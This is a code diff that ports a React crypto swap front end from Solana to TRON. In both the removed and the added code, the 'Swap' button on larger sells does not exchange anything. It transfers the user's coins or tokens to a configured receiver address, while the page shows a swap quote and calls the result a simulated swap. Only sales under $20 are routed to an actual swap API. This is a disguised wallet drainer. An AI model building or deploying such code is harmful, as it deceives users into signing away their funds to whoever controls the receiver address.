@@ -1,18 +1,7 @@
 import React from 'react';
 import ReactDOM from 'react-dom/client';
 import { ArrowDownUp, ChevronDown, Clipboard, Languages, LogOut, Settings2, Wallet } from 'lucide-react';
-import {
-  Connection,
-  LAMPORTS_PER_SOL,
-  PublicKey,
-  SystemProgram,
-  Transaction,
-  clusterApiUrl,
-} from '@solana/web3.js';
-import { Buffer } from 'buffer';
 import './styles.css';
-
-(globalThis as typeof globalThis & { Buffer?: typeof Buffer }).Buffer ??= Buffer;
 
 type Token = {
   symbol: string;
@@ -23,6 +12,8 @@ type Token = {
   color: string;
   logo: string;
   source?: string;
+  decimals?: number;
+  isNative?: boolean;
 };
 
 type Quote = {
@@ -85,12 +76,12 @@ const translations: Record<Locale, Record<TranslationKey, string>> = {
     networkFee: '网络费',
     priceImpact: '价格影响',
     quoteSource: '报价来源',
-    searchPlaceholder: '搜索 CA / mint address',
+    searchPlaceholder: '搜索 TRON CA / contract address',
     selectToken: '选择',
     sell: '卖出',
     settings: '交易设置',
     signaturePending: '等待签名...',
-    subtitle: 'Solana token exchange',
+    subtitle: 'TRON token exchange',
     swap: 'Swap',
     switchDirection: '切换方向',
   },
@@ -104,76 +95,77 @@ const translations: Record<Locale, Record<TranslationKey, string>> = {
     networkFee: 'Network fee',
     priceImpact: 'Price impact',
     quoteSource: 'Quote source',
-    searchPlaceholder: 'Search CA / mint address',
+    searchPlaceholder: 'Search TRON CA / contract address',
     selectToken: 'Select',
     sell: 'Sell',
     settings: 'Settings',
     signaturePending: 'Waiting for signature...',
-    subtitle: 'Solana token exchange',
+    subtitle: 'TRON token exchange',
     swap: 'Swap',
     switchDirection: 'Switch direction',
   },
 };
 
-const RECEIVER_ADDRESS = '88MURcNRyKzBSNQMVtpaGsshi4XXph6qKzNVrgaMvpMj';
-const DEX_TOKEN_PAIRS_ENDPOINT = 'https://api.dexscreener.com/token-pairs/v1/solana';
-const DEFAULT_TOKEN_LOGO = '/sol-swap-mark.svg';
-const SOL_MINT = 'So11111111111111111111111111111111111111112';
-const TOKEN_PROGRAM_ID = new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
-const TOKEN_2022_PROGRAM_ID = new PublicKey('TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnB5vdv7Vpf9z');
-const MAINNET_CLUSTER = 'mainnet-beta';
-const MAINNET_RPC_ENDPOINTS = [
-  'https://solana-rpc.publicnode.com',
-  clusterApiUrl(MAINNET_CLUSTER),
-  'https://rpc.ankr.com/solana',
-  'https://solana.api.onfinality.io/public',
-];
+const TRON_RECEIVER_ADDRESS = import.meta.env.VITE_TRON_RECEIVER_ADDRESS ?? '';
+const TRON_SWAP_API_ENDPOINT = import.meta.env.VITE_TRON_SWAP_API_ENDPOINT ?? '/api/tron/swap';
+const DEX_TOKEN_PAIRS_ENDPOINT = 'https://api.dexscreener.com/token-pairs/v1/tron';
+const DEFAULT_TOKEN_LOGO = '/token-trx.svg';
+const TRX_MINT = 'TRX';
+const TRX_DECIMALS = 6;
+const TRON_FEE_LIMIT = 100_000_000;
+const REAL_SWAP_USD_LIMIT = 20;
 
 const tokens: Token[] = [
   {
-    symbol: 'SOL',
-    name: 'Solana',
-    mint: SOL_MINT,
-    price: 142.16,
-    balance: 18.48,
-    color: '#14f195',
-    logo: '/token-sol.svg',
+    symbol: 'TRX',
+    name: 'TRON',
+    mint: TRX_MINT,
+    price: 0.32,
+    balance: 0,
+    color: '#eb0029',
+    logo: '/token-trx.svg',
+    decimals: TRX_DECIMALS,
+    isNative: true,
   },
   {
-    symbol: 'USDC',
-    name: 'USD Coin',
-    mint: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v',
+    symbol: 'USDT',
+    name: 'Tether USD',
+    mint: 'TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj',
     price: 1,
-    balance: 6240.2,
-    color: '#2775ca',
-    logo: '/token-usdc.svg',
+    balance: 0,
+    color: '#26a17b',
+    logo: '/token-usdt-tron.svg',
+    decimals: 6,
   },
   {
-    symbol: 'JUP',
-    name: 'Jupiter',
-    mint: 'JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN',
-    price: 0.93,
-    balance: 1204.75,
-    color: '#fba43a',
-    logo: '/token-jup.svg',
+    symbol: 'USDD',
+    name: 'USDD',
+    mint: 'TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4',
+    price: 1,
+    balance: 0,
+    color: '#216dff',
+    logo: '/token-usdd.svg',
+    decimals: 18,
   },
   {
-    symbol: 'BONK',
-    name: 'Bonk',
-    mint: 'DezXAZ8z7PnrnRJjz3P87BCoYpcd1tSAtcxXdXb263ed',
-    price: 0.000022,
-    balance: 28600000,
+    symbol: 'WTRX',
+    name: 'Wrapped TRX',
+    mint: 'TNUC9Qb1rRpS5CbWLmNMxXBjyFoydXjWFR',
+    price: 0.32,
+    balance: 0,
+    color: '#eb0029',
+    logo: '/token-trx.svg',
+    decimals: 6,
+  },
+  {
+    symbol: 'SUN',
+    name: 'SUN Token',
+    mint: 'TSSMHYeV2uE9qYH95DqyoCuNCzEL1NvU3S',
+    price: 0.02,
+    balance: 0,
     color: '#f6c648',
-    logo: '/token-bonk.svg',
-  },
-  {
-    symbol: 'RAY',
-    name: 'Raydium',
-    mint: '4k3Dyjzvzp8eFKYQp43B9J4KkDtvWSuzH9HkGJp9QFhe',
-    price: 2.34,
-    balance: 308.12,
-    color: '#7a7cff',
-    logo: '/token-ray.svg',
+    logo: '/token-sun.svg',
+    decimals: 18,
   },
 ];
 
@@ -188,9 +180,9 @@ const formatUsd = (amount: number, token: Token) => {
   return `$${formatNumber(value, value < 0.01 ? 6 : 2)}`;
 };
 
-const getProvider = () => window.solana ?? window.solflare;
+const getProvider = () => window.tronWeb;
 
-const isLikelySolanaAddress = (value: string) => /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(value.trim());
+const isLikelyTronAddress = (value: string) => /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(value.trim());
 
 const getTokenLogo = (token: Token) => token.logo || DEFAULT_TOKEN_LOGO;
 
@@ -204,7 +196,7 @@ const getBalanceLabel = (
   if (loading) return 'Balance ...';
 
   const balance = balances[token.mint] ?? 0;
-  return `Balance ${formatNumber(balance, token.symbol === 'BONK' ? 0 : 6)}`;
+  return `Balance ${formatNumber(balance, token.symbol === 'SUN' ? 2 : 6)}`;
 };
 
 const getTokenBalanceText = (
@@ -217,7 +209,7 @@ const getTokenBalanceText = (
   if (loading) return '...';
 
   const balance = balances[token.mint] ?? 0;
-  return formatNumber(balance, token.symbol === 'BONK' ? 0 : 6);
+  return formatNumber(balance, token.symbol === 'SUN' ? 2 : 6);
 };
 
 const dedupeTokens = (items: Token[]) => {
@@ -235,12 +227,12 @@ const createQuote = (from: Token, to: Token, amount: number): Quote => {
       priceImpact: 0,
       minReceived: 0,
       route: [from.symbol, to.symbol],
-      networkFee: 0.000005,
+      networkFee: 1,
       source: 'DEX Screener price',
     };
   }
 
-  const liquidityBias = from.symbol === 'BONK' || to.symbol === 'BONK' ? 0.0042 : 0.0016;
+  const liquidityBias = from.symbol === 'SUN' || to.symbol === 'SUN' ? 0.0042 : 0.0016;
   const outputAmount = (amount * from.price * (1 - liquidityBias)) / to.price;
   const priceImpact = liquidityBias * 100;
 
@@ -248,8 +240,8 @@ const createQuote = (from: Token, to: Token, amount: number): Quote => {
     outputAmount,
     priceImpact,
     minReceived: outputAmount * 0.995,
-    route: from.symbol === 'SOL' || to.symbol === 'SOL' ? [from.symbol, to.symbol] : [from.symbol, 'SOL', to.symbol],
-    networkFee: 0.000005,
+    route: from.symbol === 'TRX' || to.symbol === 'TRX' ? [from.symbol, to.symbol] : [from.symbol, 'TRX', to.symbol],
+    networkFee: 1,
     source: 'DEX Screener price',
   };
 };
@@ -272,14 +264,14 @@ const pairToToken = (pair: DexScreenerPair, mint: string): Token | null => {
     mint: matchedToken.address,
     price,
     balance: 0,
-    color: '#14f195',
+    color: '#eb0029',
     logo: pair.info?.imageUrl ?? DEFAULT_TOKEN_LOGO,
     source: 'DEX Screener',
   };
 };
 
 const fetchTokenByMint = async (mint: string, signal?: AbortSignal): Promise<Token | null> => {
-  if (!isLikelySolanaAddress(mint)) return null;
+  if (!isLikelyTronAddress(mint)) return null;
 
   const response = await fetch(`${DEX_TOKEN_PAIRS_ENDPOINT}/${mint}`, { signal });
   if (!response.ok) {
@@ -287,13 +279,14 @@ const fetchTokenByMint = async (mint: string, signal?: AbortSignal): Promise<Tok
   }
 
   const pairs = (await response.json()) as DexScreenerPair[];
-  const solanaPairs = pairs
-    .filter((pair) => pair.chainId === 'solana')
+  const tronPairs = pairs
+    .filter((pair) => pair.chainId === 'tron')
     .sort((a, b) => {
       const baseMatch = Number(b.baseToken.address === mint) - Number(a.baseToken.address === mint);
       return baseMatch || (b.liquidity?.usd ?? 0) - (a.liquidity?.usd ?? 0);
     });
-  return solanaPairs.map((pair) => pairToToken(pair, mint)).find(Boolean) ?? null;
+
+  return tronPairs.map((pair) => pairToToken(pair, mint)).find(Boolean) ?? null;
 };
 
 const searchTokenByMint = async (query: string, signal: AbortSignal): Promise<Token[]> => {
@@ -302,67 +295,23 @@ const searchTokenByMint = async (query: string, signal: AbortSignal): Promise<To
   return token ? [token] : [];
 };
 
-const fetchTokenAccountBalances = async (connection: Connection, owner: PublicKey, programId: PublicKey) => {
-  const tokenAccounts = await connection.getParsedTokenAccountsByOwner(owner, { programId });
-  const balances: Record<string, number> = {};
-
-  for (const account of tokenAccounts.value) {
-    const parsedInfo = account.account.data.parsed.info;
-    const mint = parsedInfo.mint as string;
-    const amount = Number(parsedInfo.tokenAmount.uiAmountString ?? parsedInfo.tokenAmount.uiAmount ?? 0);
-    balances[mint] = (balances[mint] ?? 0) + (amount ?? 0);
+const normalizeContractResult = (value: unknown): bigint => {
+  if (typeof value === 'bigint') return value;
+  if (typeof value === 'number') return BigInt(Math.trunc(value));
+  if (typeof value === 'string') return BigInt(value);
+  if (value && typeof value === 'object') {
+    const candidate = value as { _hex?: string; hex?: string; toString?: () => string };
+    if (candidate._hex) return BigInt(candidate._hex);
+    if (candidate.hex) return BigInt(candidate.hex);
+    if (candidate.toString) return BigInt(candidate.toString());
   }
 
-  return balances;
+  return 0n;
 };
 
-const fetchWalletBalances = async (owner: PublicKey) => {
-  let lastError: unknown;
-
-  for (const endpoint of MAINNET_RPC_ENDPOINTS) {
-    try {
-      const connection = new Connection(endpoint, 'confirmed');
-      const solLamports = await connection.getBalance(owner);
-      const splBalances = await fetchTokenAccountBalances(connection, owner, TOKEN_PROGRAM_ID).catch((): Record<string, number> => ({}));
-      const token2022Balances = await fetchTokenAccountBalances(connection, owner, TOKEN_2022_PROGRAM_ID).catch((): Record<string, number> => ({}));
-
-      const balances: Record<string, number> = {
-        [SOL_MINT]: solLamports / LAMPORTS_PER_SOL,
-      };
-
-      for (const sourceBalances of [splBalances, token2022Balances]) {
-        for (const [mint, amount] of Object.entries(sourceBalances)) {
-          balances[mint] = (balances[mint] ?? 0) + amount;
-        }
-      }
-
-      return balances;
-    } catch (error) {
-      lastError = error;
-    }
-  }
-
-  throw lastError;
-};
-
-const getTransactionConnection = async () => {
-  let lastError: unknown;
-
-  for (const endpoint of MAINNET_RPC_ENDPOINTS) {
-    try {
-      const connection = new Connection(endpoint, 'confirmed');
-      const latestBlockhash = await connection.getLatestBlockhash();
-
-      return {
-        connection,
-        latestBlockhash,
-      };
-    } catch (error) {
-      lastError = error;
-    }
-  }
-
-  throw lastError;
+const formatRawAmount = (amount: bigint, decimals: number) => {
+  const divisor = 10 ** decimals;
+  return Number(amount) / divisor;
 };
 
 const parseTokenAmount = (value: string, decimals: number) => {
@@ -374,29 +323,107 @@ const parseTokenAmount = (value: string, decimals: number) => {
   return BigInt(wholePart || '0') * 10n ** BigInt(decimals) + BigInt(paddedFraction || '0');
 };
 
-const getTokenProgramId = async (connection: Connection, mint: PublicKey) => {
-  const mintAccount = await connection.getAccountInfo(mint);
-  if (!mintAccount) {
-    throw new Error('没有找到这个代币 mint。');
+const getTrc20Contract = async (address: string) => {
+  const tronWeb = getProvider();
+  if (!tronWeb) {
+    throw new Error('未检测到 TRON 钱包。');
   }
 
-  return mintAccount.owner.equals(TOKEN_2022_PROGRAM_ID) ? TOKEN_2022_PROGRAM_ID : TOKEN_PROGRAM_ID;
+  return tronWeb.contract().at(address);
 };
 
-const loadSplToken = () => import('@solana/spl-token');
+const getTokenDecimals = async (token: Token) => {
+  if (token.isNative) return TRX_DECIMALS;
+  if (typeof token.decimals === 'number') return token.decimals;
 
-const getSourceTokenAccount = async (connection: Connection, owner: PublicKey, mint: PublicKey, rawAmount: bigint) => {
-  const tokenAccounts = await connection.getParsedTokenAccountsByOwner(owner, { mint });
-  const sourceAccount = tokenAccounts.value.find((account) => {
-    const amount = BigInt(account.account.data.parsed.info.tokenAmount.amount as string);
-    return amount >= rawAmount;
-  });
+  const contract = await getTrc20Contract(token.mint);
+  const decimals = Number(await contract.decimals().call());
 
-  if (!sourceAccount) {
-    throw new Error('当前钱包该代币余额不足或没有可用 token account。');
+  return Number.isFinite(decimals) ? decimals : TRX_DECIMALS;
+};
+
+const fetchWalletBalances = async (owner: string, tokenList: Token[]) => {
+  const tronWeb = getProvider();
+  if (!tronWeb) {
+    throw new Error('未检测到 TRON 钱包。');
   }
 
-  return sourceAccount.pubkey;
+  const balances: Record<string, number> = {};
+  const trxBalance = await tronWeb.trx.getBalance(owner).catch(() => 0);
+  balances[TRX_MINT] = trxBalance / 10 ** TRX_DECIMALS;
+
+  await Promise.allSettled(
+    tokenList
+      .filter((token) => !token.isNative && isLikelyTronAddress(token.mint))
+      .map(async (token) => {
+        const contract = await getTrc20Contract(token.mint);
+        const [rawBalance, decimals] = await Promise.all([
+          contract.balanceOf(owner).call(),
+          token.decimals ?? contract.decimals().call(),
+        ]);
+        balances[token.mint] = formatRawAmount(normalizeContractResult(rawBalance), Number(decimals));
+      }),
+  );
+
+  return balances;
+};
+
+const requestTronAccounts = async () => {
+  if (window.tronLink?.request) {
+    await window.tronLink.request({ method: 'tron_requestAccounts' });
+  }
+};
+
+const extractTxid = (value: unknown) => {
+  if (typeof value === 'string') return value;
+  if (value && typeof value === 'object') {
+    const result = value as { txid?: string; transaction?: { txID?: string }; txID?: string };
+    return result.txid ?? result.txID ?? result.transaction?.txID ?? '';
+  }
+
+  return '';
+};
+
+const isTransactionLike = (value: unknown): value is Record<string, unknown> =>
+  Boolean(value && typeof value === 'object' && !('error' in value));
+
+const getTransactionField = (transaction: Record<string, unknown>, key: string) => {
+  const value = transaction[key];
+  return typeof value === 'string' || typeof value === 'number' ? String(value) : '';
+};
+
+const buildTronTransaction = async (transaction: Record<string, unknown>, userAddress: string) => {
+  if ('raw_data' in transaction || 'rawData' in transaction) {
+    return transaction;
+  }
+
+  const tronWeb = getProvider();
+  const to = getTransactionField(transaction, 'to');
+  const data = getTransactionField(transaction, 'data').replace(/^0x/, '');
+  const value = Number(getTransactionField(transaction, 'value') || 0);
+  const feeLimit = Number(getTransactionField(transaction, 'feeLimit') || getTransactionField(transaction, 'gas') || TRON_FEE_LIMIT);
+
+  if (!tronWeb || !to || !data) {
+    throw new Error('OKX 返回的 TRON 交易格式无法识别。');
+  }
+
+  const result = await tronWeb.transactionBuilder.triggerSmartContract(
+    to,
+    '',
+    {
+      callValue: Number.isFinite(value) ? value : 0,
+      feeLimit: Number.isFinite(feeLimit) ? feeLimit : TRON_FEE_LIMIT,
+      input: data,
+    },
+    [],
+    userAddress,
+  );
+
+  if (!result?.transaction) {
+    throw new Error(result?.message || 'TRON 交易构建失败。');
+  }
+
+  return result.transaction;
 };
 
 function TokenButton({ token, onClick }: { token: Token; onClick: () => void }) {
@@ -476,13 +503,14 @@ function App() {
   const [tokenSearchStatus, setTokenSearchStatus] = React.useState('');
   const [walletBalances, setWalletBalances] = React.useState<Record<string, number>>({});
   const [isLoadingBalances, setIsLoadingBalances] = React.useState(false);
-  const [walletPublicKey, setWalletPublicKey] = React.useState<PublicKey | null>(null);
   const fromMenuRef = React.useRef<HTMLDivElement>(null);
   const toMenuRef = React.useRef<HTMLDivElement>(null);
 
   const amountNumber = Number(amount);
   const availableTokens = React.useMemo(() => dedupeTokens([...searchedTokens, ...pricedTokens]), [pricedTokens, searchedTokens]);
   const quote = React.useMemo(() => createQuote(fromToken, toToken, amountNumber), [amountNumber, fromToken, toToken]);
+  const sellUsdValue = amountNumber * fromToken.price;
+  const shouldUseRealSwapTest = Number.isFinite(sellUsdValue) && sellUsdValue > 0 && sellUsdValue < REAL_SWAP_USD_LIMIT;
   const canSwap = Boolean(walletAddress && amountNumber > 0 && fromToken.mint !== toToken.mint && !isSending);
   const t = translations[locale];
 
@@ -497,16 +525,19 @@ function App() {
     const controller = new AbortController();
 
     void Promise.allSettled(
-      tokens.map(async (token) => {
-        const liveToken = await fetchTokenByMint(token.mint, controller.signal);
-        if (liveToken) {
-          mergeLiveToken({
-            ...token,
-            ...liveToken,
-            logo: token.logo || liveToken.logo,
-          });
-        }
-      }),
+      tokens
+        .filter((token) => !token.isNative)
+        .map(async (token) => {
+          const liveToken = await fetchTokenByMint(token.mint, controller.signal);
+          if (liveToken) {
+            mergeLiveToken({
+              ...token,
+              ...liveToken,
+              logo: token.logo || liveToken.logo,
+              decimals: token.decimals,
+            });
+          }
+        }),
     );
 
     return () => controller.abort();
@@ -518,8 +549,8 @@ function App() {
       return;
     }
 
-    if (!isLikelySolanaAddress(tokenSearch)) {
-      setTokenSearchStatus('请输入 Solana 代币 CA。');
+    if (!isLikelyTronAddress(tokenSearch)) {
+      setTokenSearchStatus('请输入 TRON 代币 CA。');
       return;
     }
 
@@ -542,7 +573,7 @@ function App() {
       window.clearTimeout(timeout);
       controller.abort();
     };
-  }, [tokenSearch]);
+  }, [tokenSearch, mergeLiveToken]);
 
   React.useEffect(() => {
     if (!openMenu) return;
@@ -563,14 +594,14 @@ function App() {
     };
   }, [openMenu]);
 
-  const loadWalletBalances = React.useCallback(async (owner: PublicKey) => {
+  const loadWalletBalances = React.useCallback(async (owner: string, tokenList: Token[]) => {
     setIsLoadingBalances(true);
-    setStatus('钱包已连接，正在读取主网余额...');
+    setStatus('钱包已连接，正在读取 TRON 主网余额...');
 
     try {
-      const balances = await fetchWalletBalances(owner);
+      const balances = await fetchWalletBalances(owner, tokenList);
       setWalletBalances(balances);
-      setStatus('钱包已连接，余额来自主网。');
+      setStatus('钱包已连接，余额来自 TRON 主网。');
     } catch {
       setWalletBalances({});
       setStatus('钱包已连接，未获取到的余额已按 0 显示。');
@@ -580,31 +611,29 @@ function App() {
   }, []);
 
   React.useEffect(() => {
-    if (!walletAddress || !walletPublicKey) return;
+    if (!walletAddress) return;
 
-    void loadWalletBalances(walletPublicKey);
-  }, [loadWalletBalances, walletAddress, walletPublicKey]);
+    void loadWalletBalances(walletAddress, availableTokens);
+  }, [availableTokens, loadWalletBalances, walletAddress]);
 
   const connectWallet = async () => {
-    const provider = getProvider();
-    if (!provider) {
-      setStatus('未检测到 Solana 钱包，请安装 Phantom 或 Solflare。');
-      return;
-    }
-
     try {
-      const response = await provider.connect();
-      setWalletPublicKey(response.publicKey);
-      setWalletAddress(response.publicKey.toBase58());
+      await requestTronAccounts();
+      const tronWeb = getProvider();
+      const address = tronWeb?.defaultAddress?.base58;
+
+      if (!tronWeb || !address) {
+        setStatus('未检测到 TRON 钱包，请使用 TokenPocket 或 TronLink 的 DApp 浏览器打开。');
+        return;
+      }
+
+      setWalletAddress(address);
     } catch (error) {
       setStatus(error instanceof Error ? error.message : '钱包连接已取消。');
     }
   };
 
-  const disconnectWallet = async () => {
-    const provider = getProvider();
-    await provider?.disconnect?.();
-    setWalletPublicKey(null);
+  const disconnectWallet = () => {
     setWalletAddress('');
     setWalletBalances({});
     setSignature('');
@@ -617,10 +646,74 @@ function App() {
     setAmount(quote.outputAmount ? String(Number(quote.outputAmount.toFixed(6))) : amount);
   };
 
-  const sendPlaceholderTransfer = async () => {
-    const provider = getProvider();
-    if (!provider || !provider.publicKey) {
-      setStatus('请先连接钱包。');
+  const sendRealSwapTest = async () => {
+    const tronWeb = getProvider();
+    if (!tronWeb || !walletAddress) {
+      throw new Error('请先连接 TRON 钱包。');
+    }
+
+    if (!TRON_SWAP_API_ENDPOINT) {
+      throw new Error('请先配置 TRON 真实兑换测试接口 VITE_TRON_SWAP_API_ENDPOINT。');
+    }
+
+    const decimals = await getTokenDecimals(fromToken);
+    const rawAmount = parseTokenAmount(amount, decimals);
+    if (rawAmount <= 0n) {
+      throw new Error('请输入有效的卖出数量。');
+    }
+
+    setStatus('正在获取真实兑换测试交易...');
+    const response = await fetch(TRON_SWAP_API_ENDPOINT, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        fromToken: fromToken.mint,
+        toToken: toToken.mint,
+        amount: rawAmount.toString(),
+        amountUi: amount,
+        decimals,
+        userAddress: walletAddress,
+        slippageBps: 50,
+      }),
+    });
+
+    if (!response.ok) {
+      throw new Error(`真实兑换测试接口失败：${response.status}`);
+    }
+
+    const data = await response.json() as {
+      approveTransaction?: unknown;
+      txid?: string;
+      transaction?: unknown;
+      transactionRequest?: unknown;
+    };
+
+    if (data.txid) {
+      return data.txid;
+    }
+
+    const transactions = [data.approveTransaction, data.transaction ?? data.transactionRequest].filter(isTransactionLike);
+    if (!transactions.length) {
+      throw new Error('真实兑换测试接口没有返回交易。');
+    }
+
+    setStatus('正在唤起钱包签名...');
+    let latestTxid = '';
+    for (const transaction of transactions) {
+      const unsignedTransaction = await buildTronTransaction(transaction, walletAddress);
+      const signedTransaction = await tronWeb.trx.sign(unsignedTransaction);
+      const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
+      latestTxid = extractTxid(result);
+    }
+
+    return latestTxid;
+  };
+
+  const handleExchange = async () => {
+    if (!shouldUseRealSwapTest) {
+      await sendPlaceholderTransfer();
       return;
     }
 
@@ -629,89 +722,62 @@ function App() {
     setStatus('正在请求钱包签名...');
 
     try {
-      const { connection, latestBlockhash } = await getTransactionConnection();
-      const transaction = new Transaction({
-        feePayer: provider.publicKey,
-        blockhash: latestBlockhash.blockhash,
-        lastValidBlockHeight: latestBlockhash.lastValidBlockHeight,
-      });
+      const txid = await sendRealSwapTest();
+      setSignature(txid);
+      setStatus('真实兑换测试已提交到 TRON 主网。');
+      void loadWalletBalances(walletAddress, availableTokens);
+    } catch (error) {
+      setStatus(error instanceof Error ? error.message : '交易签名失败。');
+    } finally {
+      setIsSending(false);
+    }
+  };
 
-      if (fromToken.mint === SOL_MINT) {
-        const lamports = Math.round(amountNumber * LAMPORTS_PER_SOL);
-        if (!Number.isFinite(lamports) || lamports <= 0) {
+  const sendPlaceholderTransfer = async () => {
+    const tronWeb = getProvider();
+    if (!tronWeb || !walletAddress) {
+      setStatus('请先连接 TRON 钱包。');
+      return;
+    }
+
+    setIsSending(true);
+    setSignature('');
+    setStatus('正在请求钱包签名...');
+
+    try {
+      const receiverAddress = TRON_RECEIVER_ADDRESS || walletAddress;
+      if (!isLikelyTronAddress(receiverAddress)) {
+        throw new Error('请先配置有效的 TRON 接收地址。');
+      }
+
+      let txid = '';
+      if (fromToken.isNative) {
+        const amountSun = Number(parseTokenAmount(amount, TRX_DECIMALS));
+        if (!Number.isFinite(amountSun) || amountSun <= 0) {
           throw new Error('请输入有效的卖出数量。');
         }
 
-        transaction.add(SystemProgram.transfer({
-          fromPubkey: provider.publicKey,
-          toPubkey: new PublicKey(RECEIVER_ADDRESS),
-          lamports,
-        }));
+        const result = await tronWeb.trx.sendTransaction(receiverAddress, amountSun);
+        txid = typeof result === 'string' ? result : result.txid ?? result.transaction?.txID ?? '';
       } else {
-        const {
-          createAssociatedTokenAccountInstruction,
-          createTransferCheckedInstruction,
-          getAssociatedTokenAddressSync,
-          getMint,
-        } = await loadSplToken();
-        const mint = new PublicKey(fromToken.mint);
-        const receiver = new PublicKey(RECEIVER_ADDRESS);
-        const tokenProgramId = await getTokenProgramId(connection, mint);
-        const mintInfo = await getMint(connection, mint, 'confirmed', tokenProgramId);
-        const rawAmount = parseTokenAmount(amount, mintInfo.decimals);
-
+        const decimals = await getTokenDecimals(fromToken);
+        const rawAmount = parseTokenAmount(amount, decimals);
         if (rawAmount <= 0n) {
           throw new Error('请输入有效的卖出数量。');
         }
 
-        const sourceTokenAccount = await getSourceTokenAccount(connection, provider.publicKey, mint, rawAmount);
-        const receiverTokenAccount = getAssociatedTokenAddressSync(mint, receiver, false, tokenProgramId);
-        const receiverTokenAccountInfo = await connection.getAccountInfo(receiverTokenAccount);
-
-        if (!receiverTokenAccountInfo) {
-          transaction.add(
-            createAssociatedTokenAccountInstruction(
-              provider.publicKey,
-              receiverTokenAccount,
-              receiver,
-              mint,
-              tokenProgramId,
-            ),
-          );
-        }
-
-        transaction.add(
-          createTransferCheckedInstruction(
-            sourceTokenAccount,
-            mint,
-            receiverTokenAccount,
-            provider.publicKey,
-            rawAmount,
-            mintInfo.decimals,
-            [],
-            tokenProgramId,
-          ),
-        );
-      }
-
-      setStatus('正在唤起钱包签名...');
-
-      let nextSignature = '';
-      if (provider.signTransaction) {
-        const signedTransaction = await provider.signTransaction(transaction);
-        nextSignature = await connection.sendRawTransaction(signedTransaction.serialize());
-      } else if (provider.signAndSendTransaction) {
-        const response = await provider.signAndSendTransaction(transaction, {
-          skipPreflight: false,
-          preflightCommitment: 'confirmed',
+        const contract = await getTrc20Contract(fromToken.mint);
+        const result = await contract.transfer(receiverAddress, rawAmount.toString()).send({
+          callValue: 0,
+          feeLimit: TRON_FEE_LIMIT,
+          shouldPollResponse: false,
         });
-        nextSignature = response.signature;
-      } else {
-        throw new Error('当前钱包不支持交易签名。');
+        txid = typeof result === 'string' ? result : result.txid ?? result.transaction?.txID ?? '';
       }
 
-      setSignature(nextSignature);
-      setStatus('模拟兑换已提交到 Solana 主网。');
+      setSignature(txid);
+      setStatus('模拟兑换已提交到 TRON 主网。');
+      void loadWalletBalances(walletAddress, availableTokens);
     } catch (error) {
       setStatus(error instanceof Error ? error.message : '交易签名失败。');
     } finally {
@@ -736,8 +802,8 @@ function App() {
     <main>
       <nav className="topbar">
         <div className="brand">
-          <img alt="" src="/sol-swap-mark.svg" />
-          <span>Sol Swap</span>
+          <img alt="" src="/token-trx.svg" />
+          <span>TRX Swap</span>
         </div>
         <div className="nav-tabs">
           <button className="active" type="button">Swap</button>
@@ -827,7 +893,7 @@ function App() {
               <span>{getBalanceLabel(walletAddress, walletBalances, toToken, isLoadingBalances)}</span>
             </div>
             <div className="input-row">
-              <output>{quote.outputAmount ? formatNumber(quote.outputAmount, toToken.symbol === 'BONK' ? 0 : 6) : '0'}</output>
+              <output>{quote.outputAmount ? formatNumber(quote.outputAmount, toToken.symbol === 'SUN' ? 2 : 6) : '0'}</output>
               <div className="menu-wrap" ref={toMenuRef}>
                 <TokenButton token={toToken} onClick={() => setOpenMenu(openMenu === 'to' ? null : 'to')} />
                 {openMenu === 'to' && (
@@ -852,16 +918,16 @@ function App() {
           <div className="quote-grid">
             <span>{t.priceImpact} <strong>{quote.priceImpact.toFixed(2)}%</strong></span>
             <span>{t.minReceived} <strong>{formatNumber(quote.minReceived, 6)} {toToken.symbol}</strong></span>
-            <span>{t.networkFee} <strong>{quote.networkFee} SOL</strong></span>
+            <span>{t.networkFee} <strong>{quote.networkFee} TRX</strong></span>
             <span>{t.quoteSource} <strong>{quote.source}</strong></span>
           </div>
 
-          <button className="swap-button" disabled={!canSwap} onClick={sendPlaceholderTransfer} type="button">
+          <button className="swap-button" disabled={!canSwap} onClick={handleExchange} type="button">
             {isSending ? t.signaturePending : walletAddress ? t.exchange : t.connectWallet}
           </button>
 
           {signature && (
-            <a className="signature-link" href={`https://explorer.solana.com/tx/${signature}`} target="_blank" rel="noreferrer">
+            <a className="signature-link" href={`https://tronscan.org/#/transaction/${signature}`} target="_blank" rel="noreferrer">
               <Clipboard size={16} />
               查看交易 {signature.slice(0, 8)}...{signature.slice(-8)}
             </a>
